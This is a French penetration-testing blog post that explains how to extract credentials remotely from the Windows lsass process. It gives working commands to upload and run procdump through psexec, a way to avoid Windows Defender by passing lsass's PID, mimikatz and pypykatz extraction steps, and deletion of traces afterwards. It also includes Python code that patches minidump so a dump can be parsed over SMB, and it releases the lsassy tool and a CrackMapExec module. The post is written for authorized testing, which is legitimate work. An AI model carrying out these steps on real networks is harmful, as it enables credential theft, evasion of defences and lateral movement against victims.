---
title: "Extraction des secrets de lsass à distance"
date: 2019-11-28 22:40:00
author: "Pixis"
layout: post
permalink: /remote-lsass-dump-passwords/
redirect_from:
  - "/remote-lass-dump-passwords"
  - "/remote-lass-dump-passwords/"
disqus_identifier: 0000-0000-0000-00b3
cover: assets/uploads/2019/11/procdump.png
description: "Cet article présente la modification d'un outil pour extraire à distance les mots de passe présents dans un dump de lsass, évitant ainsi d'utiliser Mimikatz et d'être détecté par les Antivirus"
tags:
  - "Active Directory"
  - Windows
translation:
  - "en"
---

Lors de tests d'intrusion en entreprise, le mouvement latéral et l'élévation de privilèges sont deux concepts fondamentaux pour avancer et prendre le contrôle de la cible. Il existe une multitude de moyens de faire l'un ou l'autre, mais aujourd'hui nous allons présenter une nouvelle technique pour lire le contenu d'un dump de lsass à distance, diminuant significativement la latence et la détection lors de l'extraction de mots de passe sur un ensemble de machines.

<!--more-->

## Introduction

Un petit message d'introduction pour remercier [mpgn](https://twitter.com/mpgn_x64) qui m'a beaucoup aidé sur différents sujets, et avec qui je travaille en partie sur ce projet, et [Skelsec](https://twitter.com/skelsec) pour ses conseils et ses idées.

## CrackMapExec

L'outil [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) est développé et maintenu par [Byt3bl33d3r](https://twitter.com/byt3bl33d3r). Son utilité est de pouvoir exécuter des actions sur un ensemble de machines de manière asynchrone, donc relativement rapidement. L'outil permet de s'authentifier sur les machines distantes avec un compte de domaine, un compte local, et un password ou un hash, donc via la technique de "Pass the hash".

CrackMapExec a été développé de manière modulaire. Il est possible de créer ses propres modules que l'outil exécutera lorsqu'il se connectera à une machine. Il en existe déjà beaucoup, comme l'énumération d'informations (DNS, Chrome, AntiVirus), l'exécution de BloodHound ou encore la recherche de mots de passe dans les "Group Policy Preferences".

## Module Mimikatz

Il en existe un en particulier, qui était très efficace pendant quelques temps, c'était le module [Mimikatz](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/modules/mimikatz.py). CrackMapExec exécute Mimikatz sur les machines distantes afin d’extraire les identifiants de la mémoire de lsass ou **Local Security Authority SubSystem**. C'est dans ce processus que se trouvent les différents **Security Service Providers** ou **SSP**, c'est à dire les paquets qui gèrent les différents types d'authentification. Pour des raisons pratiques, les identifiants entrés par un utilisateur sont très souvent enregistrés dans l'un de ces paquets pour qu'il n'ait pas à les entrer une nouvelle fois quelques secondes ou minutes plus tard. 

C'est pourquoi Mimikatz extrait les informations situées dans ces différents SSP pour tenter de trouver des secrets d'identification, et les affiche à l'attaquant. Ainsi, si un compte à privilèges s'est connecté sur l'une des machines compromises, le module Mimikatz permet de récupérer rapidement ses identifiants et ainsi profiter des privilèges de ce compte pour compromettre plus de ressources.

Mais aujourd'hui, la majorité des antivirus détecte la présence et/ou l'exécution de Mimikatz et le bloque. CrackMapExec a beau attendre une réponse des machines visées, l'antivirus a joué son rôle, et nous n'avons plus les secrets qui apparaissent sur notre écran.

## Méthode manuelle : Procdump

Suite à ce constat, je me suis tourné vers une méthode beaucoup plus manuelle mais qui a le mérite d'être fonctionnelle en utilisant l'outil [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump).

Procdump est un outil de la suite [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/) qui a été écrite par [Marc Russinovich](https://blogs.technet.microsoft.com/markrussinovich/) pour simplifier la vie des administrateurs. Cette suite d'outils a été adoptée par un grand nombre de personnes, à tel point que Microsoft a décidé de l'acheter vers 2006, et les exécutables sont maintenant signés par Microsoft, donc reconnus comme sains par Windows.

L'outil procdump fait donc partie de ces outils, et il permet tout simplement de faire un dump de la mémoire d'un processus en cours d'exécution. Il s'attache au processus, lit sa mémoire et la retranscrit dans un fichier.

```
procdump --accepteula -ma <processus> processus_dump.dmp
```

Or, pour extraire les secrets des utilisateurs, Mimikatz va notamment fouiller dans la mémoire du processus **lsass**, comme expliqué précédemment.

Il est alors possible de faire un dump du processus lsass sur une machine, de rapatrier ce dump sur notre machine locale, et d'extraire les identifiants à l'aide de Mimikatz.

Pour dumper le processus lsass, nous pouvons donc utiliser l'outil procdump, puisque celui-ci est connu de Windows, et ne sera pas considéré comme un logiciel malveillant.

Dans un premier temps, il faut l'envoyer sur le serveur, par exemple en utilisant `smbclient.py` de la suite [impacket](https://github.com/SecureAuthCorp/impacket)

[![Put Procdump](/assets/uploads/2019/11/put_procdump.png)](/assets/uploads/2019/11/put_procdump.png)

```bash
smbclient.py ADSEC.LOCAL/jsnow@DC01.adsec.local
```

```
# use C$
# cd Windows
# cd Temp
# put procdump.exe
```

Une fois uploadé, il doit être exécuté afin de créer le dump de lsass.

[![Excute Procdump](/assets/uploads/2019/11/execute_procdump.png)](/assets/uploads/2019/11/execute_procdump.png)

```bash
psexec.py adsec.local/jsnow@DC01.adsec.local "C:\\Windows\\Temp\\procdump.exe -accepteula -ma lsass C:\\Windows\\Temp\\lsass.dmp"
```

Puis le dump doit être rapatrié sur la machine de l'attaquant, suite à quoi nous pouvons supprimer les traces sur la cible (lsass.dmp et procdump.exe).

[![Get Procdump](/assets/uploads/2019/11/get_procdump.png)](/assets/uploads/2019/11/get_procdump.png)


```
# get lsass.dmp
# del procdump.exe
# del lsass.dmp
```

L'extraction des identifiants se fait de la manière suivante avec Mimikatz : la première ligne permet de charger le dump mémoire, et la deuxième d'extraire les secrets.

[![Mimikatz Dump](/assets/uploads/2019/11/mimikatz_dump.png)](/assets/uploads/2019/11/mimikatz_dump.png)


```
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords
```

Cette technique est très pratique puisqu'elle ne génère pas beaucoup de bruit et seul un logiciel légitime est utilisé sur les cibles. 


## Limites & Améliorations

Il existe différentes limitations à cette méthode. Nous allons les exposer ici, et proposer des améliorations afin d'y remédier.

### Linux / Windows

Le premier problème est que lors de mes tests, je suis majoritairement sur mon poste Linux, que ce soit pour les tests web ou les tests internes, et Mimikatz est un outil exclusivement développé pour Windows, de par son fonctionnement. Il serait idéal de pouvoir effectuer la chaine d'attaque décrite ci-dessus depuis un poste Linux.

Heureusement, le projet [Pypykatz](https://github.com/skelsec/pypykatz) de [Skelsec](https://twitter.com/skelsec) répond à cette attente. Skelsec a développé une implémentation partielle de Mimikatz en python pur. Qui dit python pur, dit cross-plateforme. Cet outil permet notamment, comme Mimikatz, d'extraire les secrets d'un dump lsass.

[![Pypykatz Example](/assets/uploads/2019/11/pypykatz_example.png)](/assets/uploads/2019/11/pypykatz_example.png)


```
pypykatz lsa minidump lsass.dmp
```

Grâce à ce projet, il est possible de tout faire depuis une machine Linux. L'ensemble des étapes présentées dans le paragraphe précédent est applicable, et lorsque lsass.dmp a été téléchargé sur la machine de l'attaquant, pypykatz est utilisé pour extraire les noms d'utilisateur et mots de passe ou hash NT de ce dump.

So far so good, let's go deeper.

### Windows Defender

Une deuxième limitation a été rencontrée, elle était due à Windows Defender. Bien que procdump soit un outil de confiance du point de vue de Windows, le fait de faire un dump de lsass est un comportement qui est considéré comme anormal par Windows Defender. Ainsi, lorsque le dump a été effectué, Windows Defender réagit et supprime le dump après quelques secondes. Si nous avons une très bonne connexion, que le dump n'est pas trop gros, et que nous sommes suffisamment rapides, il est possible de télécharger le dump avant sa suppression.

Cependant ce comportement est trop aléatoire pour s'en contenter. En regardant la documentation de procdump, je me suis rendu compte qu'il était aussi possible de lui fournir un identifiant de process (PID). Et surprise, en lui fournissant non plus le nom mais le PID de lsass, Windows Defender ne réagit plus.

Il suffit alors de trouver le PID du processus lsass, par exemple avec la commande `tasklist`

```
> tasklist /fi "imagename eq lsass.exe"

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
lsass.exe                      640 Services                   0     15,584 K
```

Puis une fois en possession de ce PID, nous le fournissons à procdump.

```
procdump -accepteula -ma 640 lsass.dmp
```

Nous avons alors tout le loisir de télécharger notre dump et de l'analyser ensuite sur notre machine, comme précédemment.

### Méthode manuelle

Cette opération est certes pratique, mais elle reste manuelle. Nous avons parlé de CrackMapExec et de sa modularité au début de cet article, c'est pourquoi j'ai écrit un module permettant d'automatiser cette opération. Pour chaque cible fournie à CrackMapExec, si l'attaquant est administrateur local de la cible, le module va uploader procdump sur la cible, l'exécuter, récupérer le dump de lsass et va ensuite l'analyser avec pypykatz.

Ce module fonctionne bien, mais il est long, très long à s'exécuter, et parfois le téléchargement du dump de lsass ne se termine pas car le fichier est trop volumineux. Il s'agit alors d'optimiser ce module.

### Taille d'un dump

Nous sommes maintenant en mesure de dumper lsass sur la machine distante et de l'analyser en local sur notre linux de manière automatique avec un nouveau module CrackMapExec. Mais un dump mémoire de processus, ce n'est pas quelques octets, ni même quelques kilo octets. Ce sont plusieurs méga octets, voire dizaines de méga octets pour lsass. Lors de mes tests, certains dumps avaient une taille de plus de 150Mo. Si nous voulons automatiser ce processus, il va falloir trouver une solution, car télécharger un dump lsass sur un sous-réseau de 200 machines amènerait à télécharger plusieurs dizaines de giga octets. D'une part ça prendra beaucoup de temps, surtout si ce sont des machines distantes, dans d'autres pays, et d'autre part un flux réseau anormal pourrait être détecté par les équipes de sécurité.

Jusque là, nous avions des outils pour répondre à nos problèmes, mais cette fois-ci, il va falloir mettre les mains dans le moteur.

Nous n'allons pas réinventer la roue pour autant, et nous continuerons d'utiliser pypykatz pour extraire les informations du dump de lsass. L'idée étant de n'utiliser que procdump sur la machine distante, il n'est pas envisageable d'envoyer pypykatz pour faire le travail sur la machine distante. D'une part python peut ne pas être installé, et d'autre part il est possible que pypykatz soit détecté par des antivirus.

Ces prérequis en tête, voici la méthode que nous allons utiliser : Afin d'analyser un dump en local, pypykatz doit ouvrir le fichier et lire des octets à certains endroits. Les informations recherchées dans le dump sont présentes à certains offsets, et ne sont pas plus grandes que quelques octets, ou kilo octets. Pypykatz suit des pointeurs présents à des offsets précis afin de trouver l'information qui l'intéresse.

L'idée est alors de lire ces offsets et ces adresses à distance, sur le dump présent sur la cible, et de ne rapatrier que les quelques morceaux de dump qui contiennent les informations attendues.

En ce sens, regardons comment fonctionne pypykatz. La ligne de commande que nous utilisons jusqu'ici est la suivante :

```
pypykatz lsa minidump lsass.dmp
```

C'est en fait la classe `LSACMDHelper` qui gère la partie `lsa`. Et lorsqu'on lui fournit un dump de lsass, c'est la méthode `run()` de cette classe qui est appelée. Dans cette méthode `run`, il y a notamment :

```python
###### Minidump
elif args.cmd == 'minidump':
    if args.directory:
        dir_fullpath = os.path.abspath(args.memoryfile)
        file_pattern = '*.dmp'
        if args.recursive == True:
            globdata = os.path.join(dir_fullpath, '**', file_pattern)
        else:	
            globdata = os.path.join(dir_fullpath, file_pattern)
            
        logging.info('Parsing folder %s' % dir_fullpath)
        for filename in glob.glob(globdata, recursive=args.recursive):
            logging.info('Parsing file %s' % filename)
            try:
                mimi = pypykatz.parse_minidump_file(filename)
                results[filename] = mimi
            except Exception as e:
                files_with_error.append(filename)
                logging.exception('Error parsing file %s ' % filename)
                if args.halt_on_error == True:
                    raise e
                else:
                    pass
```

On voit alors que le parsing du dump se fait à la ligne suivante :

```python
mimi = pypykatz.parse_minidump_file(filename)
```

Cette méthode est définie dans `pypykatz.py` :

```python
from minidump.minidumpfile import MinidumpFile
"""
<snip>
"""
@staticmethod
def parse_minidump_file(filename):
    try:
        minidump = MinidumpFile.parse(filename)
        reader = minidump.get_reader().get_buffered_reader()
        sysinfo = KatzSystemInfo.from_minidump(minidump)
    except Exception as e:
        logger.exception('Minidump parsing error!')
        raise e
    try:
        mimi = pypykatz(reader, sysinfo)
        mimi.start()
    except Exception as e:
        #logger.info('Credentials parsing error!')
        mimi.log_basic_info()
        raise e
    return mimi
```

C'est en fait la classe `MinidumpFile` du packet `minidump` qui gère le parsing. Il faut donc creuser un peu plus loin, et étudier [minidump](https://github.com/skelsec/minidump), également écrit par Skelsec.

Dans la classe `Minidumpfile`, la méthode `parse` est la suivante :

```python
@staticmethod
def parse(filename):
    mf = MinidumpFile()
    mf.filename = filename
    mf.file_handle = open(filename, 'rb')
    mf._parse()
	return mf
```

Voilà, c'est cet endroit qui nous intéresse. Le fichier que nous passons en argument est ouvert puis son contenu est analysé. Je vous passe les extraits de code, mais en suivant la méthode privée `_parse`, nous nous rendons compte que `minidump` utilise les méthodes `read`, `seek` et `tell` pour analyser le fichier.

Il suffit alors de remplacer la fonction `open` par quelque chose que nous maitrisons afin d'ouvrir un accès vers le fichier distant, et de réécrire les méthodes `read`, `seek` et `tell`. Fort heureusement pour nous, la suite impacket possède des bouts de code qui nous serons très utiles.

Voici une partie de l'implémentation de cette classe. Du code a été simplifié pour la compréhension de l'article.

```python
"""
Réécriture de 'open' pour ouvrir et lire un fichier distant
"""
class open(object):
    def __init__(self, fpath, mode):
        domainName, userName, password, hostName, shareName, filePath = self._parseArg(fpath)
        """
        ImpacketSMBConnexion est une surclasse de impacket que j'ai écrite pour simplifier cet extrait de code
        """
        self.__conn = ImpacketSMBConnexion(hostName, userName, password, domainName)
        self.__fpath = filePath
        self.__currentOffset = 0
        self.__tid = self.__connectTree(shareName)
        self.__fid = self.__conn.openFile(self.__tid, self.__fpath)        

    """
    Parsing du nom de fichier pour récupérer les informations d'authentification
    """
    def _parseArg(self, arg):
        pattern = re.compile(r"^(?P<domainName>[a-zA-Z0-9.-_]+)/(?P<userName>[^:]+):(?P<password>[^@]+)@(?P<hostName>[a-zA-Z0-9.-]+):/(?P<shareName>[^/]+)(?P<filePath>/(?:[^/]*/)*[^/]+)$")
        matches = pattern.search(arg)
        if matches is None:
            raise Exception("{} is not valid. Expected format : domain/username:password@host:/share/path/to/file".format(arg))
        return matches.groups()
        

    """
    Ouverture du fichier distant
    """
    def __enter__(self):
        self.__fid = self.__conn.openFile(self.__tid, self.__fpath)
        return self

    """
    Fermeture de la connexion
    """
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.__conn.close()
    
    def close(self):
        self.__conn.close()

    """
    Lecture de @size octets
    """
    def read(self, size):
        if size == 0:
            return b''
        value = self.__conn.readFile(self.__tid, self.__fid, self.__currentOffset, size)
        return value

    """
    Déplacement du pointer d'offset
    """
    def seek(self, offset, whence=0):
        if whence == 0:
            self.__currentOffset = offset

    """
    Retourne l'offset actuel
    """
    def tell(self):
        return self.__currentOffset
```

Nous avons donc notre nouvelle classe qui s'authentifie sur un partage réseau, et peut lire un fichier distant avec les méthodes citées. Si nous indiquons à minidump d'utiliser cette classe au lieu de la méthode `open` classique, alors minidump va lire le contenu distant sans sourciller.

[![Remote Minidump](/assets/uploads/2019/11/minidump_patched.png)](/assets/uploads/2019/11/minidump_patched.png)


```
minidump adsec.local/jsnow:Winter_is_coming_\!@DC01.adsec.local:/C$/Windows/Temp/lsass.dmp
```

Et de la même manière, pypykatz utilisant minidump, il pourra analyser le dump distant sans le télécharger complètement.

[![Remote Pypykatz](/assets/uploads/2019/11/pypykatz_patched.png)](/assets/uploads/2019/11/pypykatz_patched.png)

```
pypykatz lsa minidump adsec.local/jsnow:Winter_is_coming_\!@DC01.adsec.local:/C$/Windows/Temp/lsass.dmp
```

### Optimisations

Nous avons maintenant un moyen de lire et analyser un dump lsass à distance, sans avoir à télécharger les 150Mo de dump sur notre machine, c'est une belle avancée ! Cependant, même si nous ne devons pas tout télécharger, le dump prend beaucoup de temps, presqu'autant que le téléchargement. Cela est dû au fait qu'à chaque fois que minidump veut lire quelques octets, une nouvelle requête est effectuée vers le serveur distant. C'est très couteux en temps, et en ajoutant un peu de log, on se rend compte que minidump fait beaucoup, beaucoup de demandes de 4 octets.

Une solution que j'ai mise en place pour pallier ce problème est de créer un buffer local, et imposer un nombre minimal d'octets à lire lors d'une requête pour réduire l'overhead. Si une requête demande moins de 4096 octets, et bien nous demanderons quand même 4096 octets, que nous sauvegarderons en local, et nous ne reverrons que les 4 premiers.

Lors des appels suivant à la fonction `read`, si la taille de données demandée est dans le buffer local, on renvoie directement le buffer local, ce qui est bien plus rapide. Si en revanche la donnée n'est pas dans le buffer, alors un nouveau buffer de 4096 octets sera demandé.

Cette optimisation fonctionne très bien car minidump effectue beaucoup de lectures concomitantes. Voici comment elle a été mise en place.

```python
def read(self, size):
    """
    On envoie une chaine vide si la taille est 0
    """
    if size == 0:
        return b''

    
    if (self.__buffer_data["offset"] <= self.__currentOffset <= self.__buffer_data["offset"] + self.__buffer_data["size"]
            and self.__buffer_data["offset"] + self.__buffer_data["size"] > self.__currentOffset + size):
        """
        Si les octets demandés sont inclus dans le buffer local self.__buffer_data["buffer"], on renvoie directement la valeur
        """
        value = self.__buffer_data["buffer"][self.__currentOffset - self.__buffer_data["offset"]:self.__currentOffset - self.__buffer_data["offset"] + size]
    else:
        """
        Sinon, on demande le buffer au fichier distant
        """
        self.__buffer_data["offset"] = self.__currentOffset

        """
        Si la demande est inférieure à self.__buffer_min_size octets, on prendra quand même self.__buffer_min_size octets
        Et on stockera le surplus pour les prochains appels.
        """
        if size < self.__buffer_min_size:
            value = self.__conn.readFile(self.__tid, self.__fid, self.__currentOffset, self.__buffer_min_size)
            self.__buffer_data["size"] = self.__buffer_min_size
            self.__total_read += self.__buffer_min_size
            
        else:
            value = self.__conn.read(self.__tid, self.__fid, self.__currentOffset, size)
            self.__buffer_data["size"] = size
            self.__total_read += size
        
        self.__buffer_data["buffer"] = value

    self.__currentOffset += size
    """
    On ne renvoie que ce qui est nécessaire
    """
    return value[:size]
```

Cette optimisation permet de drastiquement gagner du temps. Voici un benchmark fait sur ma machine :

```
$ python no_opti.py
Function=minidump, Time=39.831733942

$python opti.py
Function=minidump, Time=0.897719860077
```

Sans cette optimisation, le script prenait environ 40 secondes, tandis qu'avec l'optimisation, il prend moins d'une seconde. Moins d'une seconde pour extraire les secrets d'authentification d'un dump lsass distant de plus de 150Mo !

## Module CrackMapExec

Avec ce nouveau minidump, j'ai modifié le module CrackMapExec qui permet cette fois d'aller dumper lsass sur un ensemble de machines distantes, d'extraire les mots de passe **à distance** sur ces dumps, et de supprimer les traces de mon passage après coup.

Comme pypykatz et minidump ne fonctionnent que sous python3.6+ et que CrackMapExec n'est pas encore compatible avec python3, je ne peux pas faire de pull request pour le moment, ni importer pypykatz dans mon module. Pour le moment, l'appel à pypykatz se fait via une exécution de commande shell.

[mpgn](https://twitter.com/mpgn_x64) est en train de travailler sur le [port de CrackMapexec vers python 3](https://github.com/byt3bl33d3r/CrackMapExec/pull/323), et quand ce sera fait, je proposerai ce module à Byt3bl33d3r pour intégration dans l'outil.

## Nouveaux outils

En attendant tout ça, voici deux outils que j'ai développés pour concrétiser ces recherches :

[lsassy](https://github.com/Hackndo/lsassy) est disponible sur mon [Github](https://github.com/Hackndo/lsassy) ou sur [Pypi](https://pypi.org/project/lsassy/). C'est l'interface entre Pypykatz et la cible, qui permet de lire le dump de lsass à distance, avec les optimisations dont on a parlé dans cet article.

[Le module CrackMapExec](https://github.com/Hackndo/lsassy/tree/master/cme) permet d'automatiser tout le processus en faisant un dump de lsass sur les machines distantes, et en extrayant les identifiants des personnes connectées en utilisant **lsassy**. Il permet également de détecter les comptes ayant un chemin d'attaque pour devenir administrateur du domaine, en s'appuyant sur les données collectées avec l'outil [Bloodhound](/bloodhound)

## Conclusion

Il reste du travail à faire pour intégrer ces changements à CrackMapExec, que ce soit au niveau compatibilité des versions de python, propreté et maintenabilité du code, mais ces recherches me sont très utiles pour mieux comprendre les outils que j'utilise au quotidien.

J'ai aujourd'hui un outil qui fonctionne bien, rapidement, et qui peut être intégré à CrackMapExec en utilisant quelques tricks, donc qui me sert grandement dans mes tests internes, et j'espère que ça pourra vous être utile.

J'espère que cet article vous donnera de nouvelles idées pour faire évoluer les outils d'infosec que nous utilisons au quotidien, à plus tard pour un nouvel article !
